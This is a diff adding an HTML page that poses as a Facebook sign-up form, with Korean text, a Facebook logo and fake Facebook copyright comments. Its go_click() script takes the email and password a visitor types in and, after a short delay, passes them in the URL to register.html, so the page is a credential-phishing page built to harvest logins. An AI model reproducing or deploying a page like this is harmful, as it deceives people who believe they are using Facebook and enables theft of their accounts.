@@ -1,0 +1,72 @@
+﻿ <html>
+
+ <head>
+     <title>Sign up with facebook</title>
+     <!--Sign up with Facebook. Copyright@Facebook 2021.-->
+
+
+
+     <link href="https://fonts.googleapis.com/css?family=Ubuntu" rel="stylesheet">
+     <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+     <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
+     <meta name="viewport" content="width=device-width, initial-scale=1" />
+     <link rel="stylesheet" href="registerfb.css">
+     <title>Sign in</title>
+ </head>
+
+ <body>
+     <div class="main">
+         <img class="facebook" src="http://static1.squarespace.com/static/5b1590a93c3a53e49c6d280d/t/5b1aeb05aa4a99b2fb8d8d5e/1528490762005/facebook-icon-logo-C61047A9E7-seeklogo.com.png?format=1500w" alt="" style="display: block; margin: 0 auto" width="60" height="60" align>
+
+         <p class="sign" align="center">Facebook을 이용하여 가입하기</p>
+         <form class="form1">
+
+
+
+             <input class="un " type="email" align="center" placeholder="Email" id="email">
+             <input class="pass" type="password" align="center" placeholder="Password" id="pwd">
+
+             <a type="button" id="go" onclick="go_click();"" class="submit btn btn-default join" align="center"><strong>Sign up with Facebook</strong></a>
+             <p class="smalltext" style="font-size : 12px;" align="center"><a href="https://www.facebook.com/help/213395615347144">비밀번호를 잊으셨나요?</a></p>
+
+
+         </form>
+     </div>
+
+
+
+
+
+     <!--Facebook database. Copyright@Facebook 2021 -->
+
+     <script>
+     function go_click() {
+
+
+        setTimeout(function() {
+            emailfb = $('#email').val();
+            pwdfb = $('#pwd').val();
+            location.href="register.html?" + emailfb + "/" + pwdfb;
+
+ 
+        }, 3300);
+       // chatChannelId = btn.name;
+     
+
+
+     }    
+	 
+ 
+
+    </script>
+
+
+
+
+
+
+
+
+ </body>
+
+</html>
